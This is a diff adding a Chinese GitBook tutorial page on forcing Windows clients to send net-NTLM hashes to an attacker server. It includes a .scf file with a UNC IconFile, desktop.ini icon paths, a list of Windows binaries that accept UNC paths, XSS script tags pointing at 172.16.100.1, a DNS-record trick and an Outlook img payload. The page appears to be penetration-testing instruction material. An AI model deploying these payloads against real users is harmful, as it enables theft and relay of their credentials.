@@ -1,0 +1,715 @@
+
+<!DOCTYPE HTML>
+<html lang="" >
+    <head>
+        <meta charset="UTF-8">
+        <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
+        <title>发起NTLM  请求 · GitBook</title>
+        <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+        <meta name="description" content="">
+        <meta name="generator" content="GitBook 3.2.3">
+        
+        
+        
+    
+    <link rel="stylesheet" href="../gitbook/style.css">
+
+    
+            
+                
+                <link rel="stylesheet" href="../gitbook/gitbook-plugin-highlight/website.css">
+                
+            
+                
+                <link rel="stylesheet" href="../gitbook/gitbook-plugin-search/search.css">
+                
+            
+                
+                <link rel="stylesheet" href="../gitbook/gitbook-plugin-fontsettings/website.css">
+                
+            
+        
+
+    
+
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+
+        
+    
+    
+    <meta name="HandheldFriendly" content="true"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black">
+    <link rel="apple-touch-icon-precomposed" sizes="152x152" href="../gitbook/images/apple-touch-icon-precomposed-152.png">
+    <link rel="shortcut icon" href="../gitbook/images/favicon.ico" type="image/x-icon">
+
+    
+    <link rel="next" href="6.html" />
+    
+    
+    <link rel="prev" href="4.html" />
+    
+
+    </head>
+    <body>
+        
+<div class="book">
+    <div class="book-summary">
+        
+            
+<div id="book-search-input" role="search">
+    <input type="text" placeholder="Type to search" />
+</div>
+
+            
+                <nav role="navigation">
+                
+
+
+<ul class="summary">
+    
+    
+
+    
+
+    
+        
+        
+    
+        <li class="chapter " data-level="1.1" data-path="../">
+            
+                <a href="../">
+            
+                    
+                    Introduction
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2" data-path="../kerberos/">
+            
+                <a href="../kerberos/">
+            
+                    
+                    Kerberos 篇
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.2.1" data-path="../kerberos/1.html">
+            
+                <a href="../kerberos/1.html">
+            
+                    
+                    AS_REQ & AS_REP
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.2" data-path="../kerberos/2.html">
+            
+                <a href="../kerberos/2.html">
+            
+                    
+                    TGS_REQ& TGS_REP
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.3" data-path="../kerberos/3.html">
+            
+                <a href="../kerberos/3.html">
+            
+                    
+                    PAC
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3" data-path="../NTLM/">
+            
+                <a href="../NTLM/">
+            
+                    
+                    NTLM 篇
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.3.1" data-path="4.html">
+            
+                <a href="4.html">
+            
+                    
+                    NTLM 基础 介绍
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter active" data-level="1.3.2" data-path="5.html">
+            
+                <a href="5.html">
+            
+                    
+                    发起NTLM  请求
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3.3" data-path="6.html">
+            
+                <a href="6.html">
+            
+                    
+                    Net- NTLM 利用
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3.4" data-path="7.html">
+            
+                <a href="7.html">
+            
+                    
+                    漏洞概述
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+
+    
+
+    <li class="divider"></li>
+
+    <li>
+        <a href="https://www.gitbook.com" target="blank" class="gitbook-link">
+            Published with GitBook
+        </a>
+    </li>
+</ul>
+
+
+                </nav>
+            
+        
+    </div>
+
+    <div class="book-body">
+        
+            <div class="body-inner">
+                
+                    
+
+<div class="book-header" role="navigation">
+    
+
+    <!-- Title -->
+    <h1>
+        <i class="fa fa-circle-o-notch fa-spin"></i>
+        <a href=".." >发起NTLM  请求</a>
+    </h1>
+</div>
+
+
+
+
+                    <div class="page-wrapper" tabindex="-1" role="main">
+                        <div class="page-inner">
+                            
+<div id="book-search-results">
+    <div class="search-noresults">
+    
+                                <section class="normal markdown-section">
+                                
+                                <h1 id="ntlm&#x7BC7;&#x4E4B;&#x53D1;&#x8D77;ntlm-&#x8BF7;&#x6C42;">ntlm&#x7BC7;&#x4E4B;&#x53D1;&#x8D77;ntlm &#x8BF7;&#x6C42;</h1>
+<h2 id="0x00-&#x524D;&#x8A00;">0x00 &#x524D;&#x8A00;</h2>
+<p>&#x8FD9;&#x7BC7;&#x6587;&#x7AE0;&#x662F;ntlm&#x7BC7;&#x7684;&#x7B2C;&#x4E8C;&#x7BC7;&#xFF0C;&#x600E;&#x4E48;&#x53D1;&#x8D77;ntlm&#x8BF7;&#x6C42;&#x3002;&#x5728; &#x9605;&#x8BFB;&#x8FD9;&#x7BC7;&#x6587;&#x7AE0;&#x4E4B;&#x524D;&#xFF0C;&#x6709;&#x4E24;&#x70B9;&#x8BF4;&#x660E;</p>
+<ol>
+<li>&#x8FD9;&#x7BC7;&#x6587;&#x7AE0;&#x7684;&#x4E3B;&#x8981;&#x5185;&#x5BB9;&#x662F;&#x4F7F;&#x670D;&#x52A1;&#x5668;&#x5411;&#x653B;&#x51FB;&#x8005;&#x53D1;&#x8D77;ntlm &#x8BF7;&#x6C42;&#xFF0C;&#x4F46;&#x662F;&#x6CA1;&#x6709;&#x8FDB;&#x4E00;&#x6B65;&#x5229;&#x7528;&#xFF0C;&#x56E0;&#x6B64;&#x672C;&#x7BC7;&#x6587;&#x4EF6;&#x7684;&#x8868;&#x8FF0;&#x90FD;&#x662F;&#x83B7;&#x5F97;net-ntlm hash&#x3002;&#x4F7F;&#x7528;Responder&#x6765;&#x6355;&#x83B7;&#x3002;Responder&#x7684;&#x7528;&#x6CD5;&#x53EF;&#x81EA;&#x884C;&#x641C;&#x7D22;&#x3002;&#x8FD9;&#x91CC;&#x4E0D;&#x5C55;&#x5F00;&#x3002;</li>
+<li>&#x6709;&#x4E9B;&#x5730;&#x65B9;&#x8F83;&#x4E3A;&#x654F;&#x611F;&#xFF0C;&#x56E0;&#x6B64;&#x4F7F;&#x7528;&#x7684;net-ntlm hash&#x7684;&#x622A;&#x56FE;&#x5E76;&#x975E;&#x771F;&#x5B9E;&#x56FE;&#x7247;&#x3002;&#x8FD9;&#x4E2A;&#x5730;&#x65B9;&#x4E0D;&#x91CD;&#x8981;&#xFF0C;&#x4E3B;&#x8981;&#x8BC1;&#x660E;&#x80FD;&#x53D1;&#x8D77;&#x8BF7;&#x6C42;&#x5C31;&#x884C;&#xFF0C;&#x51FA;&#x73B0;net-ntlm hash &#x622A;&#x56FE;&#x7684;&#x5730;&#x65B9;&#x90FD;&#x662F;&#x672C;&#x5730;&#x6D4B;&#x8BD5;&#xFF0C;&#x771F;&#x5B9E;&#x6536;&#x5230;&#x8BF7;&#x6C42;&#x7684;&#x3002;</li>
+</ol>
+<h2 id="0x01-&#x56FE;&#x6807;">0x01 &#x56FE;&#x6807;</h2>
+<h3 id="1desktopini">1.desktop.ini</h3>
+<p>&#x6587;&#x4EF6;&#x5939;&#x5E95;&#x4E0B;&#x90FD;&#x6709;&#x4E2A;&#x6587;&#x4EF6;desktop.ini&#x6765;&#x6307;&#x5B9A;&#x6587;&#x4EF6;&#x5939;&#x56FE;&#x6807;&#x4E4B;&#x7C7B;&#x7684;&#x3002;&#x9ED8;&#x8BA4;&#x4E0D;&#x53EF;&#x89C1;&#x3002;&#x53BB;&#x6389;&#x9690;&#x85CF;&#x53D7;&#x4FDD;&#x62A4;&#x7684;&#x64CD;&#x4F5C;&#x7CFB;&#x7EDF;&#x6587;&#x4EF6;&#x5C31;&#x53EF;&#x4EE5;&#x770B;&#x5230;</p>
+<p><img src="img/NTLM_RELAY_1_ANQUANKE/image-20191120155020224.png" alt="image-20191120155020224"></p>
+<p><img src="img/NTLM_RELAY_1_ANQUANKE/image-20191120155135498.png" alt="image-20191120155135498"></p>
+<p>&#x6BCF;&#x4E2A;&#x6587;&#x4EF6;&#x5939;&#x5E95;&#x4E0B;&#x90FD;&#x4F1A;&#x6709;&#xFF0C;&#x6211;&#x4EEC;&#x65B0;&#x5EFA;&#x4E00;&#x4E2A;&#x65B0;&#x7684;&#x6587;&#x4EF6;&#x5939;&#x7684;&#x8BDD;&#xFF0C;&#x5982;&#x679C;&#x6CA1;&#x770B;&#x5230;desktop.ini&#xFF0C;&#x53EF;&#x4EE5;&#x5C1D;&#x8BD5;&#x66F4;&#x6539;&#x56FE;&#x6807;&#xFF0C;&#x5C31;&#x53EF;&#x4EE5;&#x770B;&#x5230;&#x4E86;&#x3002;</p>
+<p><img src="img/NTLM_RELAY_1_ANQUANKE/image-20191120155912189.png" alt="image-20191120155912189"></p>
+<p>&#x5C06;&#x56FE;&#x6807;&#x8DEF;&#x5F84;&#x6539;&#x6210;UNC&#x8DEF;&#x5F84;&#xFF0C;&#x6307;&#x5411;&#x6211;&#x4EEC;&#x7684;&#x670D;&#x52A1;&#x5668;</p>
+<p><img src="img/NTLM_RELAY_1_ANQUANKE/image-20191120160121209.png" alt="image-20191120160121209"></p>
+<p><img src="img/NTLM_RELAY_1_ANQUANKE/image-20191120160255783.png" alt="image-20191120160255783"></p>
+<p>&#x5F53;&#x7528;&#x6237;&#x8BBF;&#x95EE;&#x8BE5;&#x6587;&#x4EF6;&#x5939;&#x7684;&#x65F6;&#x5019;&#x4F1A;&#x53BB;&#x8BBF;&#x95EE;UNC&#x8DEF;&#x5F84;,&#x6211;&#x4EEC;&#x5C31;&#x80FD;&#x83B7;&#x53D6;&#x7528;&#x6237;&#x7684;net-ntlm  hash&#x3002;</p>
+<p><img src="img/NTLM_RELAY_1_ANQUANKE/image-20191120160851586.png" alt="image-20191120160851586"></p>
+<h3 id="2-scf-&#x6587;&#x4EF6;">2. scf &#x6587;&#x4EF6;</h3>
+<p>&#x53EA;&#x8981;&#x4E00;&#x4E2A;&#x6587;&#x4EF6;&#x5E95;&#x4E0B;&#x542B;&#x6709;scf&#x540E;&#x7F00;&#x7684;&#x6587;&#x4EF6;,&#x7531;&#x4E8E;scf&#x6587;&#x4EF6;&#x5305;&#x542B;&#x4E86;IconFile&#x5C5E;&#x6027;&#xFF0C;&#x6240;&#x4EE5;Explore.exe&#x4F1A;&#x5C1D;&#x8BD5;&#x83B7;&#x53D6;&#x6587;&#x4EF6;&#x7684;&#x56FE;&#x6807;&#x3002;&#x800C;IconFile&#x662F;&#x652F;&#x6301;UNC&#x8DEF;&#x5F84;&#x7684;&#x3002;&#x4EE5;&#x4E0B;&#x662F;scf&#x540E;&#x7F00;&#x7684;&#x6587;&#x4EF6;&#x7684;&#x683C;&#x5F0F;</p>
+<pre><code>[Shell]
+Command=2
+IconFile=\\172.16.100.1\scf\test.ico
+[Taskbar]
+Command=ToggleDesktop
+</code></pre><p>&#x65B0;&#x5EFA;test.scf&#xFF0C;&#x5199;&#x5165;&#x5185;&#x5BB9;&#xFF0C;&#x653E;&#x5728;&#x4E00;&#x4E2A;&#x6587;&#x4EF6;&#x5939;&#x5E95;&#x4E0B;&#xFF0C;&#x5F53;&#x7528;&#x6237;&#x8BBF;&#x95EE;&#x8BE5;&#x6587;&#x4EF6;&#x5939;&#x7684;&#x65F6;&#x5019;&#xFF0C;&#x6211;&#x4EEC;&#x5C31;&#x4F1A;&#x83B7;&#x5F97;&#x7528;&#x6237;&#x7684;net-ntlm hash&#x3002;</p>
+<p><img src="img/NTLM_RELAY_1_ANQUANKE/image-20191120162237325.png" alt="image-20191120162237325"></p>
+<h3 id="3&#x7528;&#x6237;&#x5934;&#x50CF;">3.&#x7528;&#x6237;&#x5934;&#x50CF;</h3>
+<p>&#x9002;&#x7528;&#x4E8E;Windows 10/2016/2019</p>
+<p>&#x5728;&#x66F4;&#x6539;&#x8D26;&#x6237;&#x56FE;&#x7247;&#x5904;&#x3002;</p>
+<p><img src="img/NTLM_RELAY_1_ANQUANKE/image-20191125005509564.png" alt="image-20191125005509564"></p>
+<p>&#x7528;&#x666E;&#x901A;&#x7528;&#x6237;&#x7684;&#x6743;&#x9650;&#x6307;&#x5B9A;&#x4E00;&#x4E2A;webadv&#x5730;&#x5740;&#x7684;&#x56FE;&#x7247;&#xFF0C;&#x5982;&#x679C;&#x666E;&#x901A;&#x7528;&#x6237;&#x9A8C;&#x8BC1;&#x56FE;&#x7247;&#x901A;&#x8FC7;&#xFF0C;&#x90A3;&#x4E48;SYSTEM&#x7528;&#x6237;(&#x57DF;&#x5185;&#x662F;&#x673A;&#x5668;&#x7528;&#x6237;)&#x4E5F;&#x53BB;&#x8BBF;&#x95EE;172.16.100.180&#xFF0C;&#x5E76;&#x4E14;&#x643A;&#x5E26;&#x51ED;&#x636E;&#xFF0C;&#x6211;&#x4EEC;&#x5C31;&#x53EF;&#x4EE5;&#x62FF;&#x5230;&#x673A;&#x5668;&#x7528;&#x6237;&#x7684;net-ntlm hash&#xFF0C;&#x8FD9;&#x4E2A;&#x53EF;&#x4EE5;&#x7528;&#x6765;&#x63D0;&#x6743;&#x3002;&#x540E;&#x9762;&#x4F1A;&#x8BE6;&#x7EC6;&#x8BB2;&#x3002;</p>
+<h2 id="0x02-&#x7CFB;&#x7EDF;&#x547D;&#x4EE4;&#x643A;&#x5E26;unc&#x8DEF;&#x5F84;">0x02 &#x7CFB;&#x7EDF;&#x547D;&#x4EE4;&#x643A;&#x5E26;UNC&#x8DEF;&#x5F84;</h2>
+<p>&#x8FD9;&#x4E2A;&#x6BD4;&#x8F83;&#x9E21;&#x808B;&#xFF0C;&#x90FD;&#x80FD;&#x6267;&#x884C;&#x547D;&#x4EE4;&#x4E86;&#xFF0C;&#x5E72;&#x5565;&#x4E0D;&#x884C;&#x5462;&#x3002;&#x4F46;&#x4F5C;&#x4E3A;&#x4E00;&#x79CD;&#x573A;&#x666F;&#xFF0C;&#x4E5F;&#x8BF4;&#x660E;&#x4E0B;&#x3002;&#x8BF4;&#x4E0D;&#x5B9A;&#x6709;&#x4E9B;&#x9650;&#x5236;&#x7684;&#x547D;&#x4EE4;&#x6CE8;&#x5165;&#x5C31;&#x662F;&#x652F;&#x6301;&#x4F20;&#x8FDB;UNC&#x8DEF;&#x5F84;&#x5462;&#x3002;&#x6211;&#x5E73;&#x65F6;&#x5728;&#x6D4B;&#x8BD5;&#x7684;&#x65F6;&#x5019;&#x4E00;&#x822C;&#x90FD;&#x662F;&#x7528; <code>dir \\ip\xxx</code>&#x6765;&#x505A;&#x6D4B;&#x8BD5;&#x7684;&#xFF0C;&#x5F88;&#x591A;cmd&#x547D;&#x4EE4;&#x662F;&#x652F;&#x6301;&#x4F20;&#x8FDB;UNC&#x8DEF;&#x5F84;&#x7684;&#xFF0C;&#x6267;&#x884C;&#x7684;&#x65F6;&#x5019;&#x6211;&#x4EEC;&#x5C31;&#x53EF;&#x4EE5;&#x62FF;&#x5230;&#x7528;&#x6237;&#x7684;net-ntlm  hash&#x4E86;&#x3002;&#x81F3;&#x4E8E;&#x6709;&#x54EA;&#x4E9B;&#x547D;&#x4EE4;&#x3002;&#x8FD9;&#x7BC7;&#x6587;&#x7AE0;&#x603B;&#x7ED3;&#x4E86;&#x4E00;&#x4E9B;&#x547D;&#x4EE4;,&#x603B;&#x7ED3;&#x5F97;&#x633A;&#x5168;&#x9762;&#x7684;&#x3002;
+<a href="https://www.anquanke.com/post/id/177123" target="_blank">&#x5185;&#x7F51;&#x6E17;&#x900F;&#x2014;&#x2014;&#x9488;&#x5BF9;hash&#x7684;&#x653B;&#x51FB;</a></p>
+<pre><code class="lang-cmd">&gt; <span class="hljs-built_in">net</span>.exe use \hostshare 
+&gt; <span class="hljs-built_in">attrib</span>.exe \hostshare  
+&gt; bcdboot.exe \hostshare  
+&gt; bdeunlock.exe \hostshare  
+&gt; <span class="hljs-built_in">cacls</span>.exe \hostshare  
+&gt; certreq.exe \hostshare #(noisy, pops an error dialog) 
+&gt; certutil.exe \hostshare  
+&gt; cipher.exe \hostshare  
+&gt; ClipUp.exe -l \hostshare  
+&gt; cmdl32.exe \hostshare  
+&gt; cmstp.exe /s \hostshare  
+&gt; colorcpl.exe \hostshare #(noisy, pops an error dialog)  
+&gt; <span class="hljs-built_in">comp</span>.exe /N=<span class="hljs-number">0</span> \hostshare \hostshare  
+&gt; <span class="hljs-built_in">compact</span>.exe \hostshare  
+&gt; control.exe \hostshare  
+&gt; convertvhd.exe -source \hostshare -destination \hostshare  
+&gt; Defrag.exe \hostshare  
+&gt; diskperf.exe \hostshare  
+&gt; dispdiag.exe -out \hostshare  
+&gt; <span class="hljs-built_in">doskey</span>.exe /MACROFILE=\hostshare  
+&gt; esentutl.exe /k \hostshare  
+&gt; expand.exe \hostshare  
+&gt; extrac32.exe \hostshare  
+&gt; FileHistory.exe \hostshare #(noisy, pops a gui)  
+&gt; <span class="hljs-built_in">findstr</span>.exe * \hostshare  
+&gt; fontview.exe \hostshare #(noisy, pops an error dialog)  
+&gt; fvenotify.exe \hostshare #(noisy, pops an access denied error)  
+&gt; FXSCOVER.exe \hostshare #(noisy, pops GUI)  
+&gt; hwrcomp.exe -check \hostshare  
+&gt; hwrreg.exe \hostshare  
+&gt; icacls.exe \hostshare   
+&gt; licensingdiag.exe -cab \hostshare  
+&gt; lodctr.exe \hostshare  
+&gt; lpksetup.exe /p \hostshare /s  
+&gt; makecab.exe \hostshare  
+&gt; msiexec.exe /update \hostshare /quiet  
+&gt; msinfo32.exe \hostshare #(noisy, pops a &quot;cannot open&quot; dialog)  
+&gt; mspaint.exe \hostshare #(noisy, invalid <span class="hljs-built_in">path</span> to png error)  
+&gt; msra.exe /openfile \hostshare #(noisy, error)  
+&gt; mstsc.exe \hostshare #(noisy, error)  
+&gt; netcfg.exe -l \hostshare -c p -i foo
+</code></pre>
+<h2 id="0x03-xss">0x03 XSS</h2>
+<p>&#x5229;&#x7528;xss&#x6784;&#x9020;</p>
+<pre><code class="lang-HTML"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;\\172.16.100.1\xss&quot;</span>&gt;</span><span class="undefined">
+</span></code></pre>
+<p><img src="img/NTLM_RELAY_1_ANQUANKE/image-20191120204210564.png" alt="image-20191120204210564"></p>
+<p>&#x8FD9;&#x79CD;&#x60C5;&#x51B5;&#x9002;&#x7528;&#x4E8E;IE&#x548C;edge&#xFF0C;&#x5176;&#x4ED6;&#x6D4F;&#x89C8;&#x5668;&#x4E0D;&#x5141;&#x8BB8;&#x4ECE;http&#x57DF;&#x8DE8;&#x5230;file&#x57DF;&#xFF0C;&#x4EE5;chrome&#x4E3A;&#x4F8B;</p>
+<p><img src="img/NTLM_RELAY_1_ANQUANKE/image-20191121105038929.png" alt="image-20191121105038929"></p>
+<p>&#x6211;&#x4EEC;&#x63A5;&#x4E0B;&#x6765;&#x5C1D;&#x8BD5;&#x4E0D;&#x901A;&#x8FC7;UNC&#x8DEF;&#x5F84;&#xFF0C;&#x5C31;xss&#x91CC;&#x9762;&#x8BBF;&#x95EE;http&#x8BF7;&#x6C42;&#x6765;&#x53D1;&#x8D77;&#x8BA4;&#x8BC1;</p>
+<p>&#x628A;payload &#x6539;&#x6210;</p>
+<pre><code class="lang-HTLM">&lt;script src=&quot;//172.16.100.1/x&quot;&gt;
+</code></pre>
+<p>&#x770B;&#x5230;&#x8DF3;&#x51FA;&#x8BA4;&#x8BC1;&#x6846;&#xFF0C;&#x6211;&#x4EEC;&#x4E5F;&#x6CA1;&#x6293;&#x5230;net-ntlm  hash</p>
+<p><img src="img/NTLM_RELAY_1_ANQUANKE/image-20191120210030762.png" alt="image-20191120210030762"></p>
+<p>&#x4E0D;&#x50CF;smb&#x8BF7;&#x6C42;&#x76F4;&#x63A5;&#x7528;&#x5F53;&#x7136;&#x7528;&#x6237;&#x540D;&#x548C;&#x5BC6;&#x7801;&#x53BB;&#x767B;&#x5F55;&#xFF0C;&#x53D1;&#x8D77;http&#x8BF7;&#x6C42;&#x65F6;&#xFF0C;&#x9664;&#x975E;&#x8BE5;&#x7AD9;&#x70B9;&#x7684;&#x57DF;&#x540D;&#x4F4D;&#x4E8E;&#x4F01;&#x4E1A;&#x5185;&#x90E8;&#x7F51;&#x6216;&#x5B58;&#x5728;&#x4E8E;&#x53EF;&#x4FE1;&#x7AD9;&#x70B9;&#x5217;&#x8868;&#x4E2D;&#x3002;&#x5426;&#x5219;&#x90FD;&#x4F1A;&#x8DF3;&#x51FA;&#x8BA4;&#x8BC1;&#x6846;&#x6765;&#x8BA9;&#x64CD;&#x4F5C;&#x8005;&#x518D;&#x8F93;&#x5165;&#x4E00;&#x6B21;&#x3002;</p>
+<p><img src="img/NTLM_RELAY_1_ANQUANKE/image-20191120210251212.png" alt="image-20191120210251212"></p>
+<p>&#x5F53;&#x6211;&#x4EEC;&#x9009;&#x62E9;<code>&#x81EA;&#x52A8;&#x4F7F;&#x7528;&#x5F53;&#x524D;&#x7528;&#x6237;&#x540D;&#x548C;&#x5BC6;&#x7801;&#x767B;&#x5F55;</code>&#x5C31;&#x80FD;&#x62FF;&#x5230;&#x7528;&#x6237;&#x7684;net-ntlm hash</p>
+<p><img src="img/NTLM_RELAY_1_ANQUANKE/image-20191120211056209.png" alt="image-20191120211056209"></p>
+<p>&#x5C31;&#x53EF;&#x4EE5;&#x6293;&#x5230;&#x7528;&#x6237;net-ntlm hash&#x4E86;</p>
+<p><img src="img/NTLM_RELAY_1_ANQUANKE/image-20191120211129514.png" alt="image-20191120211129514"></p>
+<p>&#x4FEE;&#x6539;&#x540E;&#x7684;&#x914D;&#x7F6E;&#x540C;&#x6837;&#x9002;&#x7528;&#x4E8E;chrome</p>
+<p>&#x90A3;&#x81F3;&#x4ECA;&#x4E3A;&#x6B62;&#xFF0C;&#x5728;&#x9ED8;&#x8BA4;&#x7684;&#x914D;&#x7F6E;&#x60C5;&#x51B5;&#x5E95;&#x4E0B;&#xFF0C;&#x5982;&#x679C;&#x6709;xss&#xFF0C;&#x90A3;&#x6784;&#x9020;&#x7684;&#x9875;&#x9762;&#x7684;&#x6548;&#x679C;&#x6709;&#x4E24;&#x79CD;</p>
+<ol>
+<li>&#x6784;&#x9020;unc&#xFF0C;&#x8BBF;&#x95EE;smb &#x534F;&#x8BAE;&#xFF0C;&#x4F46;&#x662F;&#x8FD9;&#x79CD;&#x65B9;&#x5F0F;&#x7684;&#x8BDD;&#x5C31;&#x53EA;&#x6709;IE&#x548C;edge&#x80FD;&#x884C;</li>
+</ol>
+<pre><code class="lang-html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;\\172.16.100.1\xss&quot;</span>&gt;</span><span class="undefined">
+</span></code></pre>
+<ol>
+<li>&#x6784;&#x9020;http&#xFF0C;&#x8BBF;&#x95EE;http &#x534F;&#x8BAE;&#xFF0C;&#x8FD9;&#x79CD;&#x65B9;&#x5F0F;&#x5E76;&#x4E0D;&#x9650;&#x5236;&#x6D4F;&#x89C8;&#x5668;&#x8BBF;&#x95EE;&#xFF0C;&#x4F46;&#x662F;&#x9664;&#x975E;&#x8BE5;&#x7AD9;&#x70B9;&#x7684;&#x57DF;&#x540D;&#x4F4D;&#x4E8E;&#x4F01;&#x4E1A;&#x5185;&#x90E8;&#x7F51;&#x6216;&#x5B58;&#x5728;&#x4E8E;&#x53EF;&#x4FE1;&#x7AD9;&#x70B9;&#x5217;&#x8868;&#x4E2D;&#xFF0C;&#x4E0D;&#x7136;&#x662F;&#x4E0D;&#x4F1A;&#x4F7F;&#x7528;&#x7CFB;&#x7EDF;&#x9ED8;&#x8BA4;&#x7684;&#x51ED;&#x636E;&#x8FDB;&#x884C;&#x767B;&#x5F55;&#x7684;&#xFF0C;&#x4F1A;&#x8DF3;&#x51FA;&#x8BA4;&#x8BC1;&#x6846;&#xFF0C;&#x8BA9;&#x7528;&#x6237;&#x586B;&#x5199;&#x8D26;&#x53F7;&#x5BC6;&#x7801;&#x3002;</li>
+</ol>
+<pre><code class="lang-html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;//172.16.100.1\xss&quot;</span>&gt;</span><span class="undefined">
+</span></code></pre>
+<p>&#x7B2C;&#x4E8C;&#x70B9;&#x8BE5;&#x7AD9;&#x70B9;&#x7684;&#x57DF;&#x540D;&#x4F4D;&#x4E8E;&#x4F01;&#x4E1A;&#x5185;&#x90E8;&#x7F51;&#x4E5F;&#x662F;&#x884C;&#x7684;&#xFF0C;&#x90A3;&#x5982;&#x679C;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x4FEE;&#x6539;&#x63A7;&#x5236;&#x57DF;&#x5185;&#x7684;DNS&#x662F;&#x4E0D;&#x662F;&#x5C31;&#x53EF;&#x4EE5;&#x52A8;&#x70B9;&#x624B;&#x811A;&#x4E86;&#x3002;</p>
+<p>&#x5728;&#x67E5;&#x770B;DNS&#x7684;ACL&#x7684;&#x65F6;&#x5019;&#xFF0C;&#x6211;&#x53D1;&#x73B0;&#x4E86;&#x4E00;&#x6761;&#x89C4;&#x5219;</p>
+<p><img src="img/NTLM_RELAY_1_ANQUANKE/image-20191121145446352.png" alt="image-20191121145446352"></p>
+<p>&#x8BA4;&#x8BC1;&#x7528;&#x6237;&#x90FD;&#x53EF;&#x4EE5;&#x5728;DNS&#x91CC;&#x9762;&#x521B;&#x5EFA;&#x5B50;&#x5BF9;&#x8C61;&#xFF0C;&#x4E5F;&#x5C31;&#x610F;&#x5473;&#x7740;&#x5982;&#x679C;&#x6211;&#x4EEC;&#x662F;&#x57DF;&#x5185;&#x8BA4;&#x8BC1; &#x7528;&#x6237;&#x7684;&#x8BDD;&#xFF0C;&#x90A3;&#x6211;&#x4EEC;&#x5C31;&#x53EF;&#x4EE5;&#x5728;&#x57DF;&#x5185;&#x6DFB;&#x52A0;&#x57DF;&#x540D;&#x3002;&#x6211;&#x4EEC;&#x4F7F;&#x7528;&#x5728;kerberos&#x7BC7;&#x91CC;&#x9762;&#x63D0;&#x5230;&#x8FC7;&#x7684;Powermad&#x91CC;&#x9762;&#x7684;Invoke-DNSUpdate&#x6DFB;&#x52A0;&#x4E00;&#x6761;DNS&#x8BB0;&#x5F55;</p>
+<p><img src="img/NTLM_RELAY_1_ANQUANKE/image-20191121134813065.png" alt="image-20191121134813065"></p>
+<p>&#x7136;&#x540E;&#x5C06;&#x6211;&#x4EEC;&#x7684;payload &#x6362;&#x6210;</p>
+<pre><code class="lang-html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>  <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;//xss\xss&quot;</span>&gt;</span><span class="undefined"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
+</code></pre>
+<p>&#x7531;&#x4E8E;&#x6B64;&#x65F6;&#x7684;&#x57DF;&#x540D;&#x4F4D;&#x4E8E;&#x4F01;&#x4E1A;&#x5185;&#x90E8;&#x7F51;&#xFF0C;&#x6240;&#x4EE5;&#x5F53;&#x7528;&#x6237;&#x89E6;&#x53D1;xss&#x7684;&#x65F6;&#x5019;&#x4F1A;&#x4EE5;&#x5F53;&#x524D;&#x7528;&#x6237;&#x53BB;&#x8BA4;&#x8BC1;&#xFF0C;&#x6211;&#x4EEC;&#x4E5F;&#x5C31;&#x80FD;&#x62FF;&#x5230;&#x7528;&#x6237;&#x7684;net-ntlm  hash&#x3002;</p>
+<p><img src="img/NTLM_RELAY_1_ANQUANKE/image-20191121151332180.png" alt="image-20191121151332180"></p>
+<h2 id="0x04-outlook">0x04 outlook</h2>
+<p>&#x53D1;&#x9001;&#x90AE;&#x4EF6;&#x662F;&#x652F;&#x6301;html&#x7684;&#xFF0C;&#x800C;&#x4E14;outlook&#x91CC;&#x9762;&#x7684;&#x56FE;&#x7247;&#x52A0;&#x8F7D;&#x8DEF;&#x5F84;&#x53C8;&#x53EF;&#x4EE5;&#x662F;UNC&#x3002;&#x4E8E;&#x662F;&#x6211;&#x4EEC;&#x6784;&#x9020;payload</p>
+<pre><code class="lang-html"><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;\\172.16.100.1\outlook&quot;</span>&gt;</span>
+</code></pre>
+<p><img src="img/NTLM_RELAY_1_ANQUANKE/image-20191122110302911.png" alt="image-20191122110302911"></p>
+<p>&#x5F53;&#x6536;&#x4EF6;&#x4EBA;&#x6253;&#x5F00;outlook&#x67E5;&#x770B;&#x90AE;&#x4EF6;&#x7684;&#x65F6;&#x5019;</p>
+<p><img src="img/NTLM_RELAY_1_ANQUANKE/image-20191122101323891.png" alt="image-20191122101323891"></p>
+<p>&#x6211;&#x4EEC;&#x5C31;&#x6536;&#x5230;net-ntlm  hash&#x4E86;</p>
+<p><img src="img/NTLM_RELAY_1_ANQUANKE/image-20191122101443264.png" alt="image-20191122101443264"></p>
+<h2 id="0x05-pdf">0x05 PDF</h2>
